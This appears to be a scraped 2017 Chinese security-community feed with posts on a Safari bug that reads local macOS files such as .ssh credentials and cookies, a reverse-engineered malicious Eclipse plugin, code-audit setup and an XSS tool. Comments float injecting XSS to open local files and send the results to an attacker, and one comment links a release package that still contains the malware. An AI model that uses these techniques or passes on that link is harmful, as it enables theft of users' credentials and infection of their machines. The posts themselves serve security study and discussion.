也就是说缺少listenaddress的情况下，是listenaddress=127.0.0.1还是listenaddress=172.26.14.15。


没有listenaddress 参数的话就直接是本地ip地址，你可以用netstat -an 看监听的端口，是0.0.0.0



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-20:


__#姿势#__

  利用 Safari 浏览器获取 macOS 敏感文件

分享来自@嘀嗒的钟  

成功利用这个bug需要满足两个条件，一是通过Safari浏览器访问本地文件，二是需要知道本地文件的绝对路径。

首先，第一个条件如何通过Safari浏览器访问本地文件，一般我们通过file://来访问本地文件，但是像Safari以及Chrome这些浏览器都对访问本地文件作了限制，大部分从Internet上下载的文件也是无法访问本地文件的。但是作者通过测试发现，Safari浏览器会对某些Internet上下载的文件放宽验证机制，从而导致可以访问本地文件（作者在文章中通过Mac桌面版的telegram传播恶意的xhtm可以突破safari浏览器的验证机制）

其次，如何获取本地文件的绝对路径，在macos系统的，如果用户有权访问某个文件夹并且访问过，通常会在该文件夹下生成一个隐藏文件.DS\_Store，.DS\_Store的作用类似于windows系统下的Thumbs.db，但是所不同的是，.DS\_Store 文件包含了文件夹以及该文件夹下所有文件的名称，我们通过解析.DS\_Store就可以获取该文件夹下所有文件和文件夹的名称，这样就可以拼接出文件的绝对路径（理论上可以遍历系统上所有的文件）

因为很多敏感的文件都存在于当前用户文件夹下，例如.ssh文件下的登录凭证，各类浏览器的cookies，对于如何获取当前用户名称，文章提供了一种方法，通过获取系统日志（/var/log/system.log 和 /var/log/install.log）来查找当前用户的名称。

参考链接：

[https://lab.wallarm.com/hunting-the-files-34caa0c1496](https://lab.wallarm.com/hunting-the-files-34caa0c1496)



[如何通过简单的网页文件从macOS中盗取文件？ - 嘶吼 RoarTalk – 回归最本质的信息安全...](http://www.4hou.com/system/7012.html)


PoC: 
[GitHub - Bo0oM/Safiler: Safari local file reader](https://github.com/Bo0oM/Safiler)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个技巧针对 Mac 的攻击，很不错，有实战意义。

<img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不只是safari吧 同样是输入file://c:/ IE Edge 会直接弹出进入到c盘根目录的窗口 firefox直接会在页面上现实文件 之前leader让我尝试能否关掉这个 查询了很多资料 只是隐约提及了和内核里的文件搜索有关 具体的并没有说出来 然后就产生了一个这样的想法 能否在存在xss的地方插入一段js 让他直接访问受害者file:///c:/Windows/System32/cmd.exe (本地测试 可以打开)然后不在用户处回显 而且像beef一样 回显在攻击者的机子上

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__ replies to <img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__: 我这边Chrome不会打开cmd，而是先下载，下载完提示“此文件可能会损害您的计算机”

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__: Firefox 可行?我这测试好像不行

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 不错😘

<img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 我刚重新试了一下 发现更新过后(不知道是浏览器更新还是系统更新 我这是win10)的确不行了 粗略查了查 可能是与'默认打开文件类型'的配置有关 我找个时间再仔细研究下 不过可以确定的是 有可能利用这个查看受害者电脑文件的方法吧

<img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 说的是直接打开cmd？ 我这里现在也不能复现了 不知道是更新系统 还是我调整了ie配置的问题 我再研究下吧(›´ω`‹ )


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-20:

> 匿名用户 提问：
现在的小圈子让我觉得国外的文章copy链接回来发小密圈？   这样子我觉得意义不大我自己都可以开小密圈。


能鼓励大家分享多不容易，你看你这说的，好像大家的分享就是贴个链接而已，这么容易，你去开个吧，然后告诉我，我捧个场去...



...

<img src="https://file.xiaomiquan.com/2d/04/2d04c5195c49789fd86eb912e2ef26da645f19bb1e15ab64753985e2ee22bdba.jpg" width="25px"/> __hezhenhai__: 资源是什么，价值在哪里，针对什么方向，自己消化后要点是什么，有什么看法和疑问，后续可能演进方向。。。我觉得这就是分享的模式吧

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/2d/04/2d04c5195c49789fd86eb912e2ef26da645f19bb1e15ab64753985e2ee22bdba.jpg" width="25px"/> __hezhenhai__: 对


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-18:


__#资源#__

  零基础逆向 Java 某流行恶意插件

分享来自@嘀嗒的钟  

本来是想翻译这篇paper的，但是突然想到圈里一直倡导大家#论英语的重要性，而且对于我这个刚过四级及格线的人，这篇paper能够一口气读下来，居然不需要借助于第三方翻译工具，可见这篇paper是多么通俗易懂，好了切入正题。

这篇paper主要讲的是没有任何逆向经验和hacking经验的纯java开发者，如何一步一步由浅入深的发现Java Eclipse Plugin的一个恶意插件：


[Log in | Eclipse - The Eclipse Foundation open sou...](https://marketplace.eclipse.org/content/eclipse-class-decompiler)



其实读下来你会发现，这个恶意插件并没有什么特殊，无非是收集用户信息，提供一个隐蔽的下载接口，如果硬要说有什么亮点，也就是这个Plugin居然上榜Java Eclipse Plugin Top 20，并有将近400k的下载量。

最后，共勉一下，学习一下作者写paper的技巧，对于不懂java开发的我来说，通读paper下来，完全能够理解逆向这个恶意插件的整个过程和每个步骤，作者这个paper写得很详细，从寻找目标到测试环境搭建到逆向过程分析再到抓包还原，图文并茂 通俗易懂。

强烈建议通读paper！强烈建议通读paper！强烈建议通读paper！重要的事情说三遍。


[Reverse Engineering an Eclipse Plugin – Learning S...](https://0x10f8.wordpress.com/2017/08/07/reverse-engineering-an-eclipse-plugin/)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 感谢@嘀嗒的钟  的分享，确实是一篇好 Paper。顺路召唤更多同学参与分享！

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 搞安全的要把英语提起来哦

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 目前， marketplace已经下架这款恶意插件，所以链接一已经失效，但是插件官网和github目前还可以访问。但是官网和github下下载的插件源代码已经删除了恶意代码部分，不过github上release出的安装包，我看了一下依然包含恶意代码，有兴趣的同学可以研究一下，安装包下载的链接：
[https://github.com/cnfree/Eclipse-Class-Decompiler...](https://github.com/cnfree/Eclipse-Class-Decompiler/releases/download/v2.10.0/eclipse-class-decompiler-update_v2.10.0.zip)


PS：难道这个跟xshell一样，被入侵后恶意添加的？😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 不知道多少人中招，而且这个后门还好危害不是那么直接

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 从marketplace的下载量以及github上源码的更新时间，估计还是很可观的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-18:

> 熟人不宜 提问：
余弦大大，能否安排一下你们团队的哪个大神分享一下流媒体平台（直播）这方面的安全性问题呢？我最近有个直播平台需要做安全测试，感觉除了常规的web安全（身份验证，鉴权，注入，重放，劫持），没有针对RTMP协议的安全用例。谢谢了！


把你问题放出来，大家可以一起讨论。

我的理解是 HTTP 上的那些安全问题（也就是 Web 安全）该测的都需要覆盖，还有网络系统相关的安全问题。而针对 RTMP 协议，这个协议的应用场景来看，就是做流媒体实时传输有关，他们估计关注：

1. 顺畅性，不要被拒绝服务
2. 不清楚是否有需要解决认证授权的事



...

<img src="https://file.xiaomiquan.com/64/90/649032a29005a37e93906d26f68a0492d5247ecf4cbfea97aa6b0e74a7a6b1b0.jpg" width="25px"/> __一个头两个大大大大大大大大大大大__: RTSP的倒是了解一些，海康威视是典型案例

<img src="https://file.xiaomiquan.com/e8/99/e8995cbaaa741fb20779eff34a1bf93dc54d0ff5113db867b2c2be54e8d5cc07.jpg" width="25px"/> __Null0__: rtsp, rtmp 都是流媒体协议，在摄像头这一块rtsp 认证比较多，直播上用的还没见什么认证

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: RTMP协议主要是推流和抓流的时候用，我理解的也是推流的时候会不会被拒绝服务，抓流的时候因为涉及到CDN估计会有一定分流效果。大家集思广益啊！


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-08-16:


__#代码审计#__

  
__#姿势#__

  
之前发了两篇代码审计的文章，但是感觉大家没什么反应，可能是因为有很多圈友缺乏相应的基础，看起来很费力。因此我决定从零开始讲代码审计，还是那句话，希望各位能有所收获。

今天先来讲环境搭建。首先，你要有一台靶机和攻击机，靶机的操作系统随意，win或者Linux都可以。如果只想放在本地，那么服务器的ip地址不能是127.0.0.1，需要绑定其他ip地址，如192.168.1.100,这样才能使用burpsuite抓包。下面是搭建资料链接。(这一段经 @大宇 同学提醒，已更正)

Linux:

- 
[LAMP环境搭建 - Linux 入门教程 - 极客学院Wiki](http://wiki.jikexueyuan.com/project/linux/lamp.html)


- 
[ApacheMySQLPHP - Community Help Wiki](https://help.ubuntu.com/community/ApacheMySQLPHP)

（这个更简单，一键安装）

Win:

- 
[http://www.phpstudy.net/](http://www.phpstudy.net/)


一个集成环境的软件，非常方便，可以选择版本。

我自己是用Mac的本机当靶机的，然后拿kali虚拟机当攻击机的，环境搭建使用的是MAMP PRO，因为这个集成相当方便，可以快速切换服务器或者php版本。

接下来就是按照phpstorm以及对于代码审计最重要的功能Xdebug。phpstorm各个操作系统都有对应版本，网上都可以找的到。我就不说了。

xdebug的安装资料则如下：

- 
[Xdebug: Documentation](https://xdebug.org/docs/install)



安装之后的配置：

- 
[PhpStorm Xdebug远程调试环境搭建原理分析及问题排查](http://paper.seebug.org/308/)


- 
[PHP调试利器XDebug Mac下安装与使用 | funbox's Blog](https://ifunbox.top/mac_php_xdebug_phpstorm_install)



概括来说就是先安装xdebug，然后修改php配置文件让它找到xdebug并且设置相关的配置信息，最后再在phpstorm里对应起来。最后，浏览器(chrome)记得安装插件jetbrains ide support，配置的地址跟端口也和之前一样。

如果无法顺利配置环境，仔细阅读paper当中的xdebug的原理，思考是哪个环节出了问题，然后再排查。

有人提到seay审计工具。其实也是可以的，但是只有win版本，相比于phpstorm的不同是加入了自动审计功能。不想麻烦配置xdebug的同学可以用seay。


如果做完了这些，你已经迈出了代码审计的第一步，接下来我会由浅入深的讲解php代码审计，从下期分享开始我会尝试用视频录制的形式去做，这样连贯性比较好，也更容易听的懂。

最后，之前有人问我拿代码审计牛的博客。其实大家无非想要的就是干货，下面是几个我觉得代码审计这块干货比较多的。

- 先知安全社区: 
[https://xianzhi.aliyun.com/forum/](https://xianzhi.aliyun.com/forum/)


- i春秋安全社区: 
[https://bbs.ichunqiu.com/forum-59-1.html](https://bbs.ichunqiu.com/forum-59-1.html)


- 知道创宇paper: 
[Paper](http://paper.seebug.org/)


- 勾陈安全实验室: 
[勾陈安全实验室](http://www.polaris-lab.com/)


- 离别歌： 
[首页 | 离别歌](https://www.leavesongs.com/)


- Orange: 
[http://blog.orange.tw/](http://blog.orange.tw/)


- lorexxar: 
[LoRexxar's Blog](https://lorexxar.cn/)



如果有人要补充的，欢迎评论区留言。



...

<img src="https://file.xiaomiquan.com/37/43/374310d6c0d10abd44b2dbd539c133fde6ac46f958196b2b642747858dc0af82.jpg" width="25px"/> __大宇__: 感谢分享

<img src="https://file.xiaomiquan.com/2b/6b/2b6b8251b0ece71353867f72a59c346e90ea5080ba6bbd441359e3e8338d3b0c.jpg" width="25px"/> __Catcher__: 感谢分享～

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 感谢分享

<img src="https://file.xiaomiquan.com/67/ce/67cee126d99cee2bd0fbf5b6bd0452c6e75b249d8ed61705c18ad469ad163d3c.jpg" width="25px"/> __ARES__: 很受益。感谢

<img src="https://file.xiaomiquan.com/16/aa/16aa532fb15c30918c1e256fe0663e4434962db15a1cfc459835d2a556a0cbb5.jpg" width="25px"/> __howl__: 后面会有一波分享就太好了。一定支持！

<img src="https://file.xiaomiquan.com/13/70/137012a11284a7beb8a308ca8d88ceb37724ec6909e6f6d8fec32eb5863ebd80.jpg" width="25px"/> __星语__: 赞赞赞

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 视频方式😄，赞！

<img src="https://file.xiaomiquan.com/92/3e/923e5a4fcb40feee5c599097f875a70a2864c539f1e4fabfc126ea5cb03d1a63.jpg" width="25px"/> __gump__: 很荣幸有大神带路，感谢！

<img src="https://file.xiaomiquan.com/91/ab/91abedc3209d808960d74414a5a7631edd9359b5e79703f4d605c02d30cc10a1.jpg" width="25px"/> __任长龙__: 感谢分享

<img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 支持！！！

<img src="https://file.xiaomiquan.com/50/15/50154c902d647320df2ca5062d97714537e014cedca871845319cb445a4fc409.jpg" width="25px"/> __GoodLuck__: 很友好 支持。。。

<img src="https://file.xiaomiquan.com/87/4a/874a9d7bc90aec06621571157ebc051fbde8f37747aa5c2d5a8ebb11163cbe88.jpg" width="25px"/> __风__: 请问一下有没有关于sublime做代码审计的配置？

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 赞！对我们这样基础薄弱的很友好😄

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/87/4a/874a9d7bc90aec06621571157ebc051fbde8f37747aa5c2d5a8ebb11163cbe88.jpg" width="25px"/> __风__: 像sublime或者atom这种编辑器确实可以武装的很像ide一样，但是太麻烦了，ide更方便而且功能强大。

<img src="https://file.xiaomiquan.com/87/4a/874a9d7bc90aec06621571157ebc051fbde8f37747aa5c2d5a8ebb11163cbe88.jpg" width="25px"/> __风__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 好的，谢谢了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-15:


__#公告#__

  [继续号召]关于圈子分享与交流氛围的促进

不少同学有提议想分享内容，但为了圈子质量考虑，如果哪位同学有想分享的可以先私信我，我们代为分享，如果分享精华超高5篇，我们会给你本圈的嘉宾权限，这样之后就可以自由分享。

分享内容不限于：红队技巧（攻击）、蓝队技巧（防御）、黑客成长经验、优秀 Paper 翻译或解读推荐、优秀工具解读推荐、黑客编程经验分享、新漏洞/新威胁经验分享、等。

如果还不明白要怎么分享，看看本圈的“精华”就好，其实不难，对吧？

如果没分享，也可以参与互动，比如点赞、评论等。圈子氛围需要大家共同维护与促进，我们努力来做好这种推动！

请珍惜现在还有的成长氛围。

<img src="https://images.xiaomiquan.com/FqP-WaQn-2hStTMFzWPWdamwKrP4?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:aq68PtXRok-Dh9sG5GltgyyGQWQ=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__: 唔，我大概属于那种立志刷全栈的爱好先看书再实践的萌新小白，正在看JS入门的那种。不过很想参与分享，感觉分享确实可以保持自己的积极性，也能帮助他人，更能互相讨论提高。不知道分享读书中摘录的要点是否可以呢？手动@余弦大大

<img src="https://file.xiaomiquan.com/c1/72/c172abf7cb79b6e84958c7e46d643c1c4e9dd14a106f35b3bcf1dd251c753a00.jpg" width="25px"/> __ohblackmagic__ replies to <img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__: 估计太初级是不给分享的。同小白。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__: 可以看看先

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 初级的好啊，太深入学习，没空简单的看看试试也算适合:)

<img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好的，谢谢弦哥，我这两天把JS入门经典刷完，然后把整个文件私信给哥：）

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__: 赞一个

<img src="https://file.xiaomiquan.com/1a/db/1adbf2af8762674318ce8f35cd5ccd83e520ad1436bb0acb2031848305e544e3.jpg" width="25px"/> __小峰__: 如何私信

<img src="https://file.xiaomiquan.com/67/5d/675dffcd278b64e6598f07db21ac3da42c6e05137481c473cfb6f7c14f193c75.jpg" width="25px"/> __Sherlock__: 在微信里没办法私信怎么办

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/67/5d/675dffcd278b64e6598f07db21ac3da42c6e05137481c473cfb6f7c14f193c75.jpg" width="25px"/> __Sherlock__: 不会吧 好些人私信我了


...

---

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ on 2017-08-15:


__#基础#__

   从零构建 TCP / IP 协议

搞安全研究网络协议是基本功。

大家可能听说过 DDoS，DDoS 就是利用网络协议实现的缺陷进行攻击的例子。

我们所有的信息都通过网络协议在传输，了解网络协议有助于我们更深层次的思考问题。

这里有一篇从零开始系列，帮助大家从无到有了解一个协议的诞生过程。


[blog/2017_08_12-tcp_ip.md at master · jiajunhuang/blog · GitHub](https://github.com/jiajunhuang/blog/blob/master/articles/2017_08_12-tcp_ip.md?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io)

 

文中提到的：
《图解 TCP／IP 协议》
《TCP／IP 协议详解卷一：协议》
推荐大家读一读。

至于对网络没有了解的朋友，推荐一本适合入门的网络书籍：
《网络是怎样连接的》
它能帮你快速建立起网络的概念。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好文

<img src="https://file.xiaomiquan.com/c1/72/c172abf7cb79b6e84958c7e46d643c1c4e9dd14a106f35b3bcf1dd251c753a00.jpg" width="25px"/> __ohblackmagic__: 非常清晰，多谢！

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/c1/72/c172abf7cb79b6e84958c7e46d643c1c4e9dd14a106f35b3bcf1dd251c753a00.jpg" width="25px"/> __ohblackmagic__: 客气：）

<img src="https://file.xiaomiquan.com/b1/52/b15262d1d4b75c57f0d2704faa29d7cd318d1d636d73aadea1247d0302ce1364.jpg" width="25px"/> __Liar__: 好像打不开了啊

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/b1/52/b15262d1d4b75c57f0d2704faa29d7cd318d1d636d73aadea1247d0302ce1364.jpg" width="25px"/> __Liar__: 我这边用运营商网络可以哦

<img src="https://file.xiaomiquan.com/b1/52/b15262d1d4b75c57f0d2704faa29d7cd318d1d636d73aadea1247d0302ce1364.jpg" width="25px"/> __Liar__ replies to <img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 可以了，我刚才科学上网的网出问题了，谢谢了😜

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/b1/52/b15262d1d4b75c57f0d2704faa29d7cd318d1d636d73aadea1247d0302ce1364.jpg" width="25px"/> __Liar__: 不用谢，已举报

<img src="https://file.xiaomiquan.com/b1/52/b15262d1d4b75c57f0d2704faa29d7cd318d1d636d73aadea1247d0302ce1364.jpg" width="25px"/> __Liar__ replies to <img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 😨举报啥

<img src="https://file.xiaomiquan.com/f7/9a/f79af1bde651a9dd2c989af5ff7daef5802563815d9456228954484c65760e60.jpg" width="25px"/> __岳锦文__: 配合wireshark一起食用，效果更佳😄

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 学习了，从零开始。😉

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 😉

<img src="https://file.xiaomiquan.com/aa/2e/aa2e1eff98669584ab72d851b866f5cb1b59f24bfb86e6960bfa9881e05e33a9.jpg" width="25px"/> __RoB__: 精辟

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/aa/2e/aa2e1eff98669584ab72d851b866f5cb1b59f24bfb86e6960bfa9881e05e33a9.jpg" width="25px"/> __RoB__: 😉

<img src="https://file.xiaomiquan.com/e1/0d/e10dbdcd9c404ec785f7ddf3e5ddf7f5402ee81bf46fbc34e92923c6551eb768.jpg" width="25px"/> __尹少爷__: 我买了这本书，看了第一章感觉又清楚了很多～书不错，以前读tcp/ip1，感觉没有串起来，这次把我看的http详解的感觉也都串起来了，感谢一下

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/e1/0d/e10dbdcd9c404ec785f7ddf3e5ddf7f5402ee81bf46fbc34e92923c6551eb768.jpg" width="25px"/> __尹少爷__: 客气😉


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-13:


__#工具#__

  XSS'OR 今天更新了，很强大，如果会玩的话。

更新了两个小地方：

Probe 探针支持 file:// 协议了；
Probe 探针的状态做了优化；

在线体验：xssor.io
开源地址：

[GitHub - evilcos/xssor2: XSS'OR - Hack with JavaScript.](https://github.com/evilcos/xssor2)



<img src="https://images.xiaomiquan.com/FjFXjgxTAku6ZUw885v0lOQmQY3P?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mBhlxLgPMFq6twDtZX0TKjEawEY=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-13:

> Canng 提问：
余大大，好奇问哈。您创业细分领域是做哪块啊？圈子里也没见你怎么分享，其实可以打打广告啥的大伙也可以对接下资源


月底或下月初 Joinsec 品牌上线，其中一个重要业务之前也提过“安全培训”，当时也是因为准备做这个才尝试开这个圈子的。

还有一个更重要的计划估计要明年才对外提，沉淀准备工作比较多，到时候应该会让大家惊讶（希望顺利）。

感谢惦记。😊



...

<img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: 😆😆线上培训啊

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: 这不，尝试下知乎 Live

<img src="https://file.xiaomiquan.com/92/3e/923e5a4fcb40feee5c599097f875a70a2864c539f1e4fabfc126ea5cb03d1a63.jpg" width="25px"/> __gump__: 安全培训有面向小白的吗，还是进阶

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/92/3e/923e5a4fcb40feee5c599097f875a70a2864c539f1e4fabfc126ea5cb03d1a63.jpg" width="25px"/> __gump__: 都会有

